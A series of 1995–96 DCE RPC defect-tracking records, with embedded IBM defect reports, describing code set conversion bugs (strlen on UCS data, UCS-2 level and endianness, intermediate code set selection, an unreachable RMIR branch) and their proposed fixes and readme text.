    95/10/23 17:54:05    open            cwang (Cathy Wang)
    95/10/23 17:59:37    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by cwang (Cathy Wang), 95/10/23 17:54:05, action: open>
In RPC cs_s_conv.c, the following code to check the iconv 
return should be changed from:
                else if (errno = E2BIG)
                        *status = rpc_s_ss_short_conv_buffer;
                else if (errno = EINVAL)
                        *status = rpc_s_ss_invalid_char_input;
to:
                else if (errno == E2BIG)
                        *status = rpc_s_ss_short_conv_buffer;
                else if (errno == EINVAL)
                        *status = rpc_s_ss_invalid_char_input;



CR Number                     : 13169
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : code set stub conversion uses strlen on UCS data
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]


Attached is IBM's internal defect report:


prefix        p
name          17945
reference     
abstract      code set stub conversion uses strlen on UCS data
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       i/o_error           
envName                                   phaseFound    unit                
level                                     phaseInject                       

addDate       95/10/21 21:52:28           assignDate    95/10/23 10:28:51   
lastUpdate    95/10/23 10:28:51           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:52:28    open            trumble (Trumble, Mary K.)
    95/10/23 10:28:52    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:52:28, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
Roundtrip code set conversion with universal fails.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
Force universal conversion.  Data will be sent to the server,
but it will not be sent back because the stub conversion
code is using strlen to determine the length of universal data,
which is encoded as UCS.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***n/a***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): all platforms

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------



REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:28:52, action: assign>
Old Owner: ywei
New Owner: cwang


    <Note by cwang (Cathy Wang), 1996/04/05 15:27:42, action: note>
The problem essentially is that strlen is used by the stub
conversion code (which is called by the un/marshalling code) to
determine the length of idl_byte data. idl_byte is NOT a null-terminated
data type.

The key fix to the problem is to correctly propagate the number of bytes
to be converted each time when iconv() function is called.  Because iconv()
can expand or shrink the data, it is important that the actual number of
bytes being converted be propagate as the input length to the next
iconv() call.

The original design points allow the conformant array or open array to
overwrite the size_is or length_is values.  However, the implementation
had many errors, and we saw hacked codes all over the RPC routines using
strlen to calculate the converted data.
    <Note by cwang (Cathy Wang), 1996/05/07 16:19:58, action: note>
    There are multiple problems being fixed in this defect.
    Following is a simple summary of the problems and fixes:
    There are multiple problems being fixed in this defect.
    Following is a simple summary of the problems and fixes for the defect:
    ======================================================================

    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    parameter to the XPG4 function iconv().  idl_byte is not a null-terminteded
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max
    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    a possibility that the converted string can be larger than the originalways
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.


    ======================================================================


    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    idl_byte data.  The length of the data stream being converted is a required    parameter to the XPG4 function iconv().  idl_byte is not a null-terminted
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max
    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    However, When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.



    ======================================================================

    Problem -
    strlen is used by the RPC stub conversion code to determine the length of
    idl_byte data.  The length of the data stream being converted is a required
    parameter to the XPG4 function iconv().  idl_byte is not a null-terminted
    data type.  idl_byte is typedefed as ndr_byte (in stubbase.h) which is
    typedefed as unsigned char (in ndrtypes.h).

    Fix -
    Remove strlen in RPC code that is used to calculate the input length for
    idl_byte data for conversion.
    ------------------------------------------------------------------------

    Problem -
    When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string.  This was taken for consideration in the design.  However, there
    is also the possibility that the converted string can be smaller, and
    more importantly, the converted string needs be passed across the
    wire as the original string for the next conversion.  This is not included
    in the design.

    Fix -
    Propagate the actual size of the converted string across the wire for
    the next conversion.
    -------------------------------------------------------------------------

    Problem -
    The logic for determining the new buffer size is:
        number-of-butes * MB_CUR_MAX
    this is not sufficient enough for the worst cases.

    Fix -
    Change the logic for determining the new buffer size to:
        number-of-butes * MB_CUR_MAX * expansion-factor
    where expansion-factor is 2 for now.
    --------------------------------------------------------------------------

    Problem -
    The buffer sizing routine determines the conversion type.  There are three
    types:
    a) no conversion required
    b) in place conversion
    c) new buffer conversion
    The in place conversion is wrong due to the fact that it assumes that
    when the max bytes of the sending code set is equal to the max

    bytes of the receiving code set, then conversion can be done "in place".
    The fact is that the conversion model is automatically evaluated and
    determined by RPC runtime, so there might be an intermediate (universal
    code set) code set being used.

    Fix -
    Comment out the code for the "in place conversion".  Either no conversion
    or new buffer conversion which will cause the un/marshaller to allocate
    new buffer to be used by the conversion code.
    --------------------------------------------------------------------------

    Problem -
    Arrays of cs_char can be fixed, varying, conformant or conformant varying.
    For a fixed array, the number of array elements in the local and network
    representations of the data must be the same as the array size stated in
    the IDL.  For a varying array, neither the number of array elements in
    the local representation nor the number of array elemetns in the network
    representation may exceed the array size in the IDL.
    However, When converting data from one code set to another, there is always
    a possibility that the converted string can be larger than the original
    string, the conversion would fail for fixed or varying array if universal
    conversion method is used or the case that shift control characters
    are imbeded in the converted string.

    Fix -
    For this release, only support conformant array and conformant varying
    array since the number of array elements in the local representation and
    the number of array elements in the network representation need not
    be the same.

    <Note by cwang (Cathy Wang), 1996/06/02 18:12:55, action: note>
I have submitted the following input to the OS/2 DCE readme for
RPC I18N changes related to this defect:

Accessing the RPC code sets attribute in the Directory namespace
================================================================

In this release, the code sets attribute should be accessed only via
the RPC NSI interface to the Directory Services.  Although the code
sets attribute has an ISO Object Identifier (OID), it should not be
referenced in the current release.



RPC Code Sets Conversion Type
=============================

The conversion type can be one of the following values:

idl_cs_no_convert               No code set conversion is required.           dl_l_cs_in_place_convert         Code set conversion can be performed in a singe

                                storage area.
idl_cs_new_buffer_convert       The converted data must be written to a new
                                storage area.

The C language representation of a conversion type structure is:

typedef enum {
      idl_cs_no_convert,
      idl_cs_in_place_convert,
      idl_cs_new_buffer_convert
      } idl_cs_convert_t;

DCE RPC supplied stub buffer sizing routines do not support the
idl_cs_in_place_convert conversion type.  The reason is
that the actual conversion method (RMIR, SMIR, CMIR or UNIVERSAL)
used is determined at runtime,
there is no guarantee that the conversion can be performed in
a single storage area.


The cs_char Attribute
=====================

Arrays of cs_char can be fixed, varying, conformant, or conformant varying.
The treatment of a scalar cs_char is similar to that of a fixed arry of
one element.  In this release only, conformant or conformant varying
arrays can be used without restrictions, because they are designed to allow
the data extpansion and contraction which can occur during code set
conversion. For fixed or varying arrays,
the size of the storage available to hold the local data is determined
by the array size specified in the IDL and the local type specified

Ain the cs_char attribute.  The array size is fixed and can not be
modified during the RPC marshalling or unmarshalling.
For fixed arrays, the number of bytes of data on the client, the
server, and the network
must be exactly equal to the number defined in the IDL file.

Following are the additional restrictions for fixed or varying arrays:

. For a fixed array, the number of array elements in the local (client and
  server) and network
  representations of the data must be the same as the array size defined in
  the IDL.  The following restrictions apply to the use of fixed arrays:
                                                                               - -  Because the array size is the input length used by the code set conversio,

    he complete array must be populated with valid data.

  -  You must write your own stub buffer sizing routines and code set
     conversion routines.  The routines provided by DCE RPC do not
     support the "idl_cs_in_place_convert" conversion type.

  -  You may write your own stub tag_setting routines or use DCE RPC
     provided tag_setting routine rpc_cs_get_tags() to set the
     sending tag value and the receiving tag value.  You must ensure
     that the code set conversion between server and
     client will not result in data expansion or contraction.

  -  You may write your own character and code sets compatibility
     evaluation routines.  You must not use the DCE RPC
     rpc_cs_eval_with_universal() because universal conversion may
     cause data expansion.
     You may use the rpc_cs_eval_without_universal()
     but keep in mind that the conversion model used by
     this routine is: RMIR, then SMIR, then CMIR.  You have to
     make sure that the conversion can be performed without data expansion
     or contraction.

. For a varying array, neither the number of array elements in the local
  representation nor the number of array elements in the network
  representation may exceed the array size in the IDL.

  Restrictions similar to those for fixed arrays also apply
  to varying arrays.  The value of length_is is the input length used
  by the code set conversion routine.  Expansion and contraction of data
  is allowed within the array size defined in the IDL file.

Additional information about code set stub routines consideration for
=====================================================================
fixed and varying arrays
========================

cs_byte_from_netcs
------------------
Parameters
  Input
    Network_data_length
      The number of idl_byte data elements to be converted.  For a varying
      array or a conformant varying array, this value is the local value of
      the length_is variable.  For a conformant array, this value is the
      local value of the size_is variable.  For a fixed array, the value is
      the array size specified in the interface definition.
  Output
    local_data_length
      The length of the converted data, in units of idl_byte.
      It is a NULL pointer if a fixed array is to be converted.
Usuage
    The routine returns the converted data, in idl_byte format.  If the data
    is a varying, conformant, or conformant varying array, the routine
    also returns the length of the converted data, in units of idl_byte.

cs_byte_local_size
------------------
Parameters
  Input
    Network_buffer_size
      The size, in units of idl_byte, of the buffer that is allocated for
      the international character data.
      For a conformant or conformant varying array, this value is the network
      value of the size_is variable for the array; that is, the value is
      the size of the unmarshalled string if no conversion is done.
  Output
    local_buffer_size
      This value is to be used as the local value of the size_is variable
      for the array, and is non-NULL only if a conformant or conformant
      varying array is to be unmarshalled.  A value of NULL in this
      parameter indicates that a fixed or varying array is to be unmarshalled.
Usuage
    Client and server stubs specify the network storage size of the data, in
    units of idl_byte, if a conformant or conformant varying array is to be
    unmarshalled, or they specify NULL if a fixed or varying array
    is to be marshalled.

    When called from a client stub, for fixed and varying arrays, the
    routine assumes that network_buffer_size is sufficient to store the
    converted data.


cs_byte_net_size
----------------
Parameters
  Output
    network_buffer_size
      This value is to be used as the network value of the size_is variable
      for the array, and is non-NULL only if a conformant or conformant
      varying array is to be marshalled.  A value of NULL in this
      parameter indicates that a fixed or varying array is to be marshalled.
Usuage
    The routine returns the new buffer size in the network_buffer_size
    parameter.  For fixed and varying arrays, the routine assumes that
    local_buffer_size is sufficient to store the converted data.

cs_byte_to_netcs
----------------
Parameters
  Input
    local_data_length
      The number of idl_byte data elements to be converted.  For a varying
      array or a conformant varying array, this value is the local value of
      the length_is variable.  For a conformant array, this value is the
      local value of the size_is variable.  For a fixed array, the value is
      the array size specified in the interface definition.
  Output
    network_data_length
      The length of the converted data, in units of idl_byte.
      It is a NULL pointer if a fixed array is to be converted.
Usuage
    The routine returns the converted data, in idl_byte format.  If the data
    is a varying, conformant, or conformant varying array, the routine
    also returns the length of the converted data, in units of idl_byte.



CR Number                     : 13168
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : universal code set should be UCS-2 Level 1, not L2
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17944
reference     
abstract      universal code set should be UCS-2 Level 1, not L2
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:49:48           assignDate    95/10/23 10:28:26   
lastUpdate    95/10/23 10:28:26           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:49:48    open            trumble (Trumble, Mary K.)
    95/10/23 10:28:26    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:49:48, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via design review and code inspection.
RFC 41.2 specifies UCS-2, Level 2 as the universal code set for
RPC code set conversion.  IBM and HP do not support this form of
UCS.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): both

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------
RFC 41.2 should be changed to specify UCS-2, Level 1.
The code should be changed to use the code set value for Level 1, rather
than Level 2.



REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:28:26, action: assign>
Old Owner: ywei
New Owner: cwang



CR Number                     : 13167
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : intermediate code set conv method implemented wrong
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report: 


prefix        p
name          17943
reference     
abstract      intermediate code set conv method implemented wrong
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:46:25           assignDate    95/10/23 10:27:27   
lastUpdate    95/10/23 10:27:27           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:46:25    open            trumble (Trumble, Mary K.)
    95/10/23 10:27:27    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:46:25, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via unit test and code inspection.

rpc_cs_eval_with_universal, rpc_cs_eval_without_universal and
rpc_cs_get_tags contain code to determine whether an intermediate
code set, other than UCS, should be used.  The intermediate code set
candidates are specified when building the code set registry data base.
The runtime code does not, however, check the list of candidates.  Instead,
it simply looks for the first code set that is present on both the
client and server, and attempts to use it for the intermediate code set.
This can result in errors from iconv after conversion starts.

OS/2 DCE's code set registry does not designate any intermediate code
sets, but, because the code does not check whether code sets are
legitimate candidates, this bug could cause failures with OS/2 in
a multi-platform environment.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment:

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): all platforms: code logic problem

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------


REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:27:27, action: assign>
Old Owner: ywei
New Owner: cwang

A
A



CR Number                     : 13166
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : RPC code set conversion UCS endian specification
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17942
reference     
abstract      RPC code set conversion UCS endian specification
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:43:22           assignDate    95/10/23 10:25:34   
lastUpdate    95/10/23 10:25:34           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:43:22    open            trumble (Trumble, Mary K.)
    95/10/23 10:25:34    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:43:22, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered by design review.
The problem will not occur in a single-platform environment.

RFC 41.2 does not explicitly specify the endian form of UCS
that will be used for universal code set conversion.  Because
the data type is byte, no endian marshalling will occur for the
UCS data.  HP, AIX, OSF/1 assume big-endian UCS, so they will
not have problems communicating.  OS/2 iconv code assumes
little-endian, so, without modification, OS/2 RPC will send
little-endian data, which will be corrupted by HP, AIX, etc.,
RPC.  Likewise, OS/2 RPC will corrupt data from those systems.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): multiple-platform environments

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------

OS/2 iconv will be extended to allow explicit specification of endianness.
OS/2 RPC will explicitly send/receive big-endian UCS data.

OSF should explicitly state that the DCE RPC universal code set is
big-endian, which will conform with ISO 10646.


REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:25:34, action: assign>
Old Owner: ywei
New Owner: cwang



CR Number                     : 13165
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : code set conversion can not use RMIR method
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17941
reference     
abstract      code set conversion can not use RMIR method
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    unit                
level                                     phaseInject                       

addDate       95/10/21 21:39:45           assignDate    95/10/23 10:22:54   
lastUpdate    95/10/23 10:22:54           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:39:45    open            trumble (Trumble, Mary K.)
    95/10/23 10:22:54    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:39:45, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via unit test and code inspection.

rpc_cs_eval_with_universal, rpc_cs_eval_without_universal and
rpc_cs_get_tags contain the following code:

    ------------------------
    smir_true = cmir_true = model_found = 0;
    for (i = 1; i <= method_p->server->count; i++)
    {
       if (model_found)
               break;
       if (method_p->client->codesets[0].c_set
               == method_p->server->codesets[i].c_set)
       {
               smir_true = 1;
               model_found = 1;
       }
       if (method_p->server->codesets[0].c_set
               == method_p->client->codesets[i].c_set)
       {
               cmir_true = 1;
               model_found = 1;
       }
    }
    if (model_found)
    {
       if (smir_true && cmir_true)
       {
            /* RMIR model works */
            method_p->method = RPC_EVAL_RMIR_MODEL;
            etc....
    ------------------------

The RMIR code segment can not be reached because the logic of the loop
exit is wrong.  Control will exit the loop as soon as a usable method
is found, making it impossible to detect the case where multiple usable
methods exist.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment:

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


    <Note by cwang (Cathy Wang), 1996/01/22 16:14:55, action: note>
The fix for this defect should be combined with the fix for cr13049.
See cr13049 for the diffs.



CR Number                     : 13164
Defect or Enhancement?        : def
